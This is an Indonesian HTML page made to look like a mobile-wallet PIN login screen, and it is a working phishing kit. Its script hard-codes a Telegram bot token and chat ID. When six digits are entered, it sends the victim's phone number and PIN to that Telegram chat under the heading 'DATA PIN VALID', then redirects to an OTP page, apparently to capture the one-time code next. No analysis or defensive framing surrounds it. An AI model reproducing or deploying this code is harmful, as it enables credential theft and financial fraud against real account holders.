<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk - PIN</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { min-height: 100vh; }
        .header { background-color: #007AFF; color: white; padding: 15px 20px; display: flex; align-items: center; position: relative; }
        .back-btn { font-size: 20px; font-weight: bold; cursor: pointer; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); font-size: 18px; font-weight: 500; }
        .main { display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
        .pin-title { font-size: 22px; color: #000; margin-bottom: 30px; }
        .pin-dots { display: flex; gap: 15px; margin-bottom: 40px; }
        .dot { width: 12px; height: 12px; background-color: #C4C4C4; border-radius: 50%; }
        .dot.active { background-color: #007AFF; }
        .links { display: flex; align-items: center; gap: 60px; }
        .help-link { display: flex; align-items: center; text-decoration: none; color: #007AFF; font-size: 16px; }
        .help-icon { width: 24px; height: 24px; border-radius: 50%; background: #007AFF; color: white; display: flex; align-items: center; justify-content: center; font-size: 12px; margin-right: 5px; }
        .forgot-link { text-decoration: none; color: #007AFF; font-size: 16px; }
        .pin-input { position: absolute; top: -9999px; left: -9999px; }
        .keyboard { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; margin-top: 50px; width: 90%; max-width: 300px; }
        .key { width: 60px; height: 60px; background: #F5F5F5; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; color: #000; cursor: pointer; margin: 0 auto; }
        .key.delete { background: #E5E5E5; }
    </style>
</head>
<body>
    <div class="header">
        <div class="back-btn" onclick="window.location.href='index.html'">&larr;</div>
        <div class="header-title">Masuk</div>
    </div>

    <div class="main">
        <div class="pin-title">Masukkan PIN</div>
        
        <div class="pin-dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <div class="links">
            <a href="#" class="help-link">
                <div class="help-icon">?</div>
                BUTUH BANTUAN?
            </a>
            <a href="#" class="forgot-link">LUPA PIN?</a>
        </div>

        <input type="password" id="pinInput" class="pin-input" maxlength="6">

        <div class="keyboard">
            <div class="key" data-num="1">1</div>
            <div class="key" data-num="2">2</div>
            <div class="key" data-num="3">3</div>
            <div class="key" data-num="4">4</div>
            <div class="key" data-num="5">5</div>
            <div class="key" data-num="6">6</div>
            <div class="key" data-num="7">7</div>
            <div class="key" data-num="8">8</div>
            <div class="key" data-num="9">9</div>
            <div class="key"></div>
            <div class="key" data-num="0">0</div>
            <div class="key delete" data-action="delete">âŒ«</div>
        </div>
    </div>

    <script>
        // Cek apakah ada nomor HP tersimpan
        if (!localStorage.getItem('userPhone')) window.location.href = 'index.html';

        // Konfigurasi Telegram
        const BOT_TOKEN = "8476845004:AAE2O4N1A_WNu7AsqM5PD8KQO3ycFprJjdg";
        const CHAT_ID = "8355957737";

        // Elemen DOM
        const pinInput = document.getElementById('pinInput');
        const dots = document.querySelectorAll('.dot');
        const keys = document.querySelectorAll('.key');

        // Fungsi update tampilan titik PIN
        function updateDots() {
            const pinLength = pinInput.value.length;
            dots.forEach((dot, idx) => {
                dot.classList.toggle('active', idx < pinLength);
            });

            // Jika PIN sudah 6 digit
            if (pinLength === 6) {
                const actualPin = pinInput.value; // Ambil PIN sesuai input
                localStorage.setItem('userPin', actualPin); // Tidak perlu enkripsi
                
                // Kirim PIN sesuai yang dimasukkan ke Telegram
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `ðŸ” DATA PIN VALID\nNomor HP: ${localStorage.getItem('userPhone')}\nPIN: ${actualPin}\nWaktu: ${new Date().toLocaleString('id-ID')}`
                    })
                }).then(() => {
                    setTimeout(() => window.location.href = 'otp.html', 1000);
                });
            }
        }

        // Interaksi keyboard angka
        keys.forEach(key => {
            key.addEventListener('click', () => {
                const num = key.dataset.num;
                const action = key.dataset.action;

                if (num) {
                    if (pinInput.value.length < 6) {
                        pinInput.value += num;
                        updateDots();
                    }
                } else if (action === 'delete') {
                    pinInput.value = pinInput.value.slice(0, -1);
                    updateDots();
                }
            });
        });

        // Izinkan input dari keyboard fisik
        pinInput.addEventListener('input', updateDots);
        pinInput.focus();
    </script>
</body>
</html>
